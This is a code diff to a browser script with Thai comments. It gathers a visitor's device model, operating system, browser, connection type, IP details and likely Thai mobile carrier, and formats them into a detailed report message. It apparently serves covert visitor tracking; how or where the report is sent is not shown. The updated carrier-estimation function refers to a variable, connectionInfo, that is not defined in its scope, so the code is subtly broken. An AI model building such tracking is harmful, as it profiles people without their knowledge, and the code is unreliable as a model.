@@ -139,33 +139,91 @@ function generateUniqueId() {
 function getDetailedDeviceInfo() {
   const userAgent = navigator.userAgent;
   const vendor = navigator.vendor || "ไม่มีข้อมูล";
+  const platform = navigator.platform || "ไม่มีข้อมูล"; // Get platform here for OS info
 
-  // ตรวจสอบประเภทอุปกรณ์
-  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-  const isTablet = /iPad|Android(?!.*Mobile)/i.test(userAgent);
+  // ตรวจสอบประเภทอุปกรณ์ (ปรับปรุงเล็กน้อย)
+  const isMobile = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+  // More specific tablet check (covers more Android tablets)
+  const isTablet = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(userAgent);
   const deviceType = isTablet ? "แท็บเล็ต" : (isMobile ? "มือถือ" : "คอมพิวเตอร์");
 
-  // ดึงชื่อรุ่นอุปกรณ์ (ประมาณการจาก User Agent)
+  // ดึงชื่อรุ่นอุปกรณ์ (ประมาณการจาก User Agent - มีข้อจำกัด)
   let deviceModel = "ไม่สามารถระบุได้";
+  let osInfo = platform; // Use navigator.platform as a base for OS
 
-  // ตรวจสอบว่าเป็น iPhone หรือไม่
-  const iPhoneMatch = userAgent.match(/iPhone\s+OS\s+(\d+)_(\d+)/i);
-  const iPadMatch = userAgent.match(/iPad.*OS\s+(\d+)_(\d+)/i);
-  const androidMatch = userAgent.match(/Android\s+([\d.]+);\s*([^;]+)/i);
+  // --- iOS Detection ---
+  const iPhoneMatch = userAgent.match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/i);
+  const iPadMatch = userAgent.match(/iPad;.*CPU.*OS (\d+)_(\d+)(?:_(\d+))? like Mac OS X/i);
+  const iPodMatch = userAgent.match(/iPod touch;.*CPU.*OS (\d+)_(\d+)(?:_(\d+))? like Mac OS X/i);
 
   if (iPhoneMatch) {
-    deviceModel = "iPhone iOS " + iPhoneMatch[1] + "." + iPhoneMatch[2];
+    const version = `${iPhoneMatch[1]}.${iPhoneMatch[2]}${iPhoneMatch[3] ? '.' + iPhoneMatch[3] : ''}`;
+    deviceModel = "iPhone";
+    osInfo = `iOS ${version}`;
   } else if (iPadMatch) {
-    deviceModel = "iPad iOS " + iPadMatch[1] + "." + iPadMatch[2];
-  } else if (androidMatch) {
-    deviceModel = androidMatch[2].trim();
+    const version = `${iPadMatch[1]}.${iPadMatch[2]}${iPadMatch[3] ? '.' + iPadMatch[3] : ''}`;
+    deviceModel = "iPad";
+    osInfo = `iPadOS ${version}`; // More specific for newer iPads
+  } else if (iPodMatch) {
+    const version = `${iPodMatch[1]}.${iPodMatch[2]}${iPodMatch[3] ? '.' + iPodMatch[3] : ''}`;
+    deviceModel = "iPod Touch";
+    osInfo = `iOS ${version}`;
   }
+  // --- Android Detection ---
+  else if (/android/i.test(userAgent)) {
+    const androidVersionMatch = userAgent.match(/Android\s+([\d.]+)/i);
+    const androidModelMatch = userAgent.match(/Android.*?; ([^)]+)\)/i); // Try to capture model after semicolon
+
+    osInfo = `Android ${androidVersionMatch ? androidVersionMatch[1] : 'ไม่ทราบเวอร์ชัน'}`;
+
+    if (androidModelMatch && androidModelMatch[1]) {
+      // Clean up the model string (remove "Build" part etc.)
+      deviceModel = androidModelMatch[1].split(' Build/')[0].trim();
+    } else {
+      deviceModel = "Android Device (ไม่ระบุรุ่น)"; // Default if model extraction fails
+    }
+  }
+  // --- Windows Detection ---
+  else if (/windows nt/i.test(userAgent)) {
+    osInfo = "Windows";
+    const winVerMatch = userAgent.match(/Windows NT (\d+\.\d+)/i);
+    if (winVerMatch) {
+      switch (winVerMatch[1]) {
+        case '10.0': osInfo = 'Windows 10/11'; break;
+        case '6.3': osInfo = 'Windows 8.1'; break;
+        case '6.2': osInfo = 'Windows 8'; break;
+        case '6.1': osInfo = 'Windows 7'; break;
+        case '6.0': osInfo = 'Windows Vista'; break;
+        case '5.1': osInfo = 'Windows XP'; break;
+      }
+    }
+    deviceModel = "PC"; // Generally PC for Windows NT
+  }
+  // --- macOS Detection ---
+  else if (/macintosh|mac os x/i.test(userAgent)) {
+    osInfo = "macOS";
+    const macVerMatch = userAgent.match(/Mac OS X (\d+)_(\d+)(?:_(\d+))?/i);
+    if (macVerMatch) {
+      osInfo = `macOS ${macVerMatch[1]}.${macVerMatch[2]}${macVerMatch[3] ? '.' + macVerMatch[3] : ''}`;
+    }
+    deviceModel = "Mac";
+  }
+   // --- Linux Detection ---
+  else if (/linux/i.test(userAgent)) {
+    osInfo = "Linux";
+    // Linux model is hard to determine, often it's just "PC" or "Unknown"
+    deviceModel = /x11|wayland/i.test(userAgent) ? "PC (Linux)" : "Linux Device";
+  }
+
+  // หมายเหตุ: การระบุรุ่นอุปกรณ์ที่แม่นยำ 100% จาก User Agent เป็นเรื่องท้าทาย
+  // ข้อมูลนี้เป็นการประมาณการที่ดีที่สุดเท่าที่จะทำได้
 
   return {
     userAgent: userAgent,
     vendor: vendor,
     deviceType: deviceType,
-    deviceModel: deviceModel
+    deviceModel: deviceModel,
+    platform: osInfo // Return the derived OS info instead of raw platform
   };
 }
 
@@ -174,56 +232,66 @@ function getConnectionInfo() {
   const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 
   let connectionInfo = {
-    type: "ไม่สามารถระบุได้",
-    effectiveType: "ไม่สามารถระบุได้",
-    downlink: "ไม่สามารถระบุได้",
-    rtt: "ไม่สามารถระบุได้",
+    type: "ไม่สามารถระบุได้", // e.g., 'wifi', 'cellular', 'ethernet'
+    effectiveType: "ไม่สามารถระบุได้", // e.g., '4g', '3g', 'slow-2g'
+    downlink: "ไม่สามารถระบุได้", // Mbps
+    rtt: "ไม่สามารถระบุได้", // ms
     saveData: false,
     isWifi: false,
     isMobile: false,
-    networkType: "ไม่สามารถระบุได้"
+    networkType: "ไม่สามารถระบุได้" // Simplified type (WiFi, Mobile Data, etc.)
   };
 
   if (connection) {
     // เก็บข้อมูลพื้นฐาน
     connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
     connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
-    connectionInfo.downlink = connection.downlink || "ไม่สามารถระบุได้";
-    connectionInfo.rtt = connection.rtt || "ไม่สามารถระบุได้";
+    connectionInfo.downlink = connection.downlink !== undefined ? connection.downlink : "ไม่สามารถระบุได้";
+    connectionInfo.rtt = connection.rtt !== undefined ? connection.rtt : "ไม่สามารถระบุได้";
     connectionInfo.saveData = connection.saveData || false;
 
-    // ตรวจสอบว่าเป็น WiFi หรือ Mobile
+    // ตรวจสอบประเภทเครือข่ายหลัก
     if (connection.type === 'wifi') {
       connectionInfo.isWifi = true;
       connectionInfo.networkType = "WiFi";
-    }
-    else if (['cellular', 'umts', 'hspa', 'lte', 'cdma', 'evdo', 'gsm', '2g', '3g', '4g', '5g'].includes(connection.type)) {
-      connectionInfo.isMobile = true;
+    } else if (connection.type === 'ethernet') {
+       connectionInfo.networkType = "Ethernet (สาย LAN)";
+    } else if (['cellular', 'bluetooth', 'wimax', 'other', 'unknown'].includes(connection.type) || !connection.type) {
+       // Consider cellular or potentially mobile if type indicates it or is unknown/other
+       // Rely more on effectiveType for mobile data speed indication
+       connectionInfo.isMobile = ['cellular', 'other', 'unknown', undefined, null].includes(connection.type); // Assume mobile if not explicitly wifi/ethernet
 
-      // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType
-      if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
-        connectionInfo.networkType = "2G";
-      } else if (connection.effectiveType === '3g') {
-        connectionInfo.networkType = "3G";
-      } else if (connection.effectiveType === '4g') {
-        connectionInfo.networkType = "4G/LTE";
-      } else if (connection.type === '5g') {
-        connectionInfo.networkType = "5G";
-      } else {
-        connectionInfo.networkType = "Mobile Data";
-      }
+       // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType
+       switch (connection.effectiveType) {
+         case 'slow-2g':
+         case '2g':
+           connectionInfo.networkType = "Mobile Data (2G)";
+           break;
+         case '3g':
+           connectionInfo.networkType = "Mobile Data (3G)";
+           break;
+         case '4g':
+           connectionInfo.networkType = "Mobile Data (4G/LTE)";
+           break;
+         // Note: '5g' is not yet part of the standard effectiveType,
+         // but some browsers might expose it via connection.type directly or custom properties.
+         // We primarily rely on effectiveType here.
+         default:
+            // If effectiveType is unknown but type suggests mobile, label it generally
+            connectionInfo.networkType = connectionInfo.isMobile ? "Mobile Data" : "Unknown";
+            break;
+       }
+       // If type is explicitly cellular, ensure isMobile is true
+       if (connection.type === 'cellular') {
+           connectionInfo.isMobile = true;
+       }
+    } else {
+        connectionInfo.networkType = connection.type; // Handle other potential types like 'bluetooth'
     }
-    else {
-      // ตรวจสอบจาก effectiveType หากไม่มีข้อมูล type ที่ชัดเจน
-      if (connection.effectiveType === '4g') {
-        // ส่วนใหญ่ถ้า effectiveType เป็น 4g มักจะเป็น WiFi
-        connectionInfo.isWifi = true;
-        connectionInfo.networkType = "WiFi(น่าจะใช่)";
-      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
-        connectionInfo.isMobile = true;
-        connectionInfo.networkType = "Mobile Data";
-      }
-    }
+
+  } else {
+      // Fallback if navigator.connection is not supported
+      connectionInfo.networkType = "ไม่รองรับ API";
   }
 
   return connectionInfo;
@@ -253,32 +321,49 @@ function detectBrowser() {
   let browserName = "ไม่ทราบ";
   let browserVersion = "ไม่ทราบ";
 
-  if (userAgent.indexOf("Firefox") > -1) {
-    browserName = "Firefox";
-    browserVersion = userAgent.match(/Firefox\/([\d.]+)/)[1];
-  } else if (userAgent.indexOf("SamsungBrowser") > -1) {
-    browserName = "Samsung Browser";
-    browserVersion = userAgent.match(/SamsungBrowser\/([\d.]+)/)[1];
-  } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
-    browserName = "Opera";
-    browserVersion = userAgent.indexOf("Opera") > -1 ?
-                     userAgent.match(/Opera\/([\d.]+)/)[1] :
-                     userAgent.match(/OPR\/([\d.]+)/)[1];
-  } else if (userAgent.indexOf("Edge") > -1) {
-    browserName = "Microsoft Edge";
-    browserVersion = userAgent.match(/Edge\/([\d.]+)/)[1];
-  } else if (userAgent.indexOf("Edg") > -1) {
+  // Order matters: Check for Edge Chromium first, then older Edge, then Chrome
+  if (/\sedg\//i.test(userAgent)) { // Edge Chromium (uses "Edg/")
     browserName = "Microsoft Edge (Chromium)";
-    browserVersion = userAgent.match(/Edg\/([\d.]+)/)[1];
-  } else if (userAgent.indexOf("Chrome") > -1) {
+    browserVersion = userAgent.match(/\sedg\/([\d.]+)/i)[1];
+  } else if (/\sedge\//i.test(userAgent)) { // Older Edge (uses "Edge/")
+    browserName = "Microsoft Edge (Legacy)";
+    browserVersion = userAgent.match(/\sedge\/([\d.]+)/i)[1];
+  } else if (/opr\/|opera/i.test(userAgent)) { // Opera
+    browserName = "Opera";
+    browserVersion = userAgent.match(/(?:opr|opera)[\s\/]([\d.]+)/i)[1];
+  } else if (/chrome/i.test(userAgent) && !/chromium/i.test(userAgent) && navigator.vendor === "Google Inc.") { // Chrome (ensure not other Chromium browsers)
     browserName = "Chrome";
-    browserVersion = userAgent.match(/Chrome\/([\d.]+)/)[1];
-  } else if (userAgent.indexOf("Safari") > -1) {
+    browserVersion = userAgent.match(/chrome\/([\d.]+)/i)[1];
+  } else if (/firefox/i.test(userAgent)) { // Firefox
+    browserName = "Firefox";
+    browserVersion = userAgent.match(/firefox\/([\d.]+)/i)[1];
+  } else if (/fxios/i.test(userAgent)) { // Firefox on iOS
+    browserName = "Firefox (iOS)";
+    browserVersion = userAgent.match(/fxios\/([\d.]+)/i)[1];
+  } else if (/samsungbrowser/i.test(userAgent)) { // Samsung Browser
+    browserName = "Samsung Browser";
+    browserVersion = userAgent.match(/samsungbrowser\/([\d.]+)/i)[1];
+  } else if (/safari/i.test(userAgent) && navigator.vendor.includes("Apple")) { // Safari (check vendor to be more sure)
     browserName = "Safari";
-    browserVersion = userAgent.match(/Version\/([\d.]+)/)[1];
-  } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
+    // Version can be tricky, sometimes it's 'Version/', sometimes inferred from OS
+    const versionMatch = userAgent.match(/version\/([\d.]+)/i);
+    if (versionMatch) {
+        browserVersion = versionMatch[1];
+    } else {
+        // Try to infer from WebKit version or OS version if 'Version/' is missing
+        const webkitMatch = userAgent.match(/applewebkit\/([\d.]+)/i);
+        if (webkitMatch) browserVersion = `(WebKit ${webkitMatch[1]})`; // Indicate it's an estimate
+    }
+  } else if (/msie|trident/i.test(userAgent)) { // Internet Explorer
     browserName = "Internet Explorer";
-    browserVersion = userAgent.match(/(?:MSIE |rv:)([\d.]+)/)[1];
+    browserVersion = userAgent.match(/(?:msie |rv:)([\d.]+)/i)[1];
+  } else {
+    // Attempt to find a generic name/version pattern
+    const genericMatch = userAgent.match(/([a-z]+)\/([\d.]+)/i);
+    if (genericMatch) {
+        browserName = genericMatch[1];
+        browserVersion = genericMatch[2];
+    }
   }
 
   return `${browserName} ${browserVersion}`;
@@ -326,68 +411,66 @@ async function getIPDetails() {
 // ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
 async function estimatePhoneNumber() {
   const phoneInfo = {
-    mobileOperator: "ไม่สามารถระบุได้",
-    possibleOperator: "ไม่สามารถระบุได้",
-    countryCode: "ไม่สามารถระบุได้",
-    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงเนื่องจากข้อจำกัดความเป็นส่วนตัวของเบราว์เซอร์"
+    mobileOperator: "ไม่สามารถระบุได้", // Determined by ISP/Network info
+    possibleOperator: "ไม่สามารถระบุได้", // Best guess based on ISP name
+    countryCode: "ไม่สามารถระบุได้", // From IP Geolocation
+    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงจากเบราว์เซอร์" // Privacy limitation
   };
 
   try {
-    // ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
-    const ipDetails = await getIPDetails();
+    // 1. Get IP Details (includes ISP/Org info)
+    const ipDetails = await getIPDetails(); // Reuse existing function
 
-    // ตรวจสอบข้อมูลผู้ให้บริการจาก isp ที่ได้จาก ipapi.co
-    const ispInfo = ipDetails.isp || "";
+    // 2. Determine Country Code from IP
+    if (ipDetails.country) {
+      phoneInfo.countryCode = ipDetails.country; // e.g., "TH"
+      // You could map common country codes to dialing codes if needed
+      // if (ipDetails.country === "TH") phoneInfo.countryCode = "+66";
+    }
 
-    // ตรวจสอบผู้ให้บริการในประเทศไทย
+    // 3. Estimate Operator from ISP/Org Name
+    const ispInfo = ipDetails.isp || ipDetails.org || ""; // Use ISP or Org name
     const thaiOperators = {
       "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
       "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
-      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"],
+      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "Real Future"], // Removed TrueOnline as it's broadband
       "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
-      "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"]
+      // Removed 3BB as it's primarily broadband
     };
 
-    // ค้นหาผู้ให้บริการจากชื่อ ISP
     for (const [operator, keywords] of Object.entries(thaiOperators)) {
-      if (keywords.some(keyword => ispInfo.includes(keyword))) {
+      if (keywords.some(keyword => ispInfo.toLowerCase().includes(keyword.toLowerCase()))) {
         phoneInfo.possibleOperator = operator;
+        phoneInfo.mobileOperator = operator; // Assume ISP indicates the mobile operator
         break;
       }
     }
 
-    // ตรวจสอบข้อมูลเพิ่มเติมจาก User Agent
-    const userAgent = navigator.userAgent;
-    if (userAgent.includes("Android")) {
-      // บนแอนดรอยด์อาจมีชื่อเครือข่ายซ่อนอยู่ใน User-Agent บางรุ่น (แต่ปัจจุบันไม่ค่อยมีแล้ว)
-      for (const [operator, keywords] of Object.entries(thaiOperators)) {
-        if (keywords.some(keyword => userAgent.includes(keyword))) {
-          phoneInfo.mobileOperator = operator;
-          break;
-        }
-      }
-    }
-
-    // ดึงข้อมูลประเทศจาก IP
-    if (ipDetails.country) {
-      phoneInfo.countryCode = ipDetails.country;
-
-      // ถ้าเป็นประเทศไทยให้ระบุรหัสประเทศ
-      if (ipDetails.country === "Thailand" || ipDetails.country === "TH") {
-        phoneInfo.countryCode = "+66";
-      }
-    }
-
-    // ตรวจสอบ Network Information API เพิ่มเติม
+    // 4. Check Network Connection Type
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (connection && connection.type === 'cellular') {
-      phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? phoneInfo.possibleOperator : "");
+    if (connection && connectionInfo.isMobile) { // Use the result from getConnectionInfo
+        phoneInfo.remarks = `เชื่อมต่อผ่านเครือข่ายมือถือ (${connectionInfo.networkType})`;
+        if (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้") {
+            phoneInfo.remarks += ` - เครือข่าย: ${phoneInfo.possibleOperator}`;
+        }
+    } else if (connection && connectionInfo.isWifi) {
+         phoneInfo.remarks = `เชื่อมต่อผ่าน WiFi (ISP: ${ispInfo || 'ไม่ทราบ'})`;
+         // If connected via WiFi but ISP is a known mobile operator, it might be tethering
+         if (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้") {
+             phoneInfo.remarks += ` - อาจเป็นการ Tethering จาก ${phoneInfo.possibleOperator}`;
+         }
+    } else {
+        phoneInfo.remarks += ` (ISP: ${ispInfo || 'ไม่ทราบ'})`;
     }
+
+    // Note: User Agent sniffing for operator is highly unreliable and generally removed from modern UAs.
 
     return phoneInfo;
 
   } catch (error) {
-    console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", error);
+    console.error("ไม่สามารถประมาณการข้อมูลเครือข่ายมือถือได้:", error);
+    // Return default info with error remark
+    phoneInfo.remarks = "เกิดข้อผิดพลาดในการดึงข้อมูลเครือข่าย";
     return phoneInfo;
   }
 }
@@ -473,6 +556,7 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
   // ข้อมูลอุปกรณ์
   message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
+  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`); // ใช้ platform ที่ได้จาก getDetailedDeviceInfo
   message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);
 
   // ข้อมูลหน้าจอ
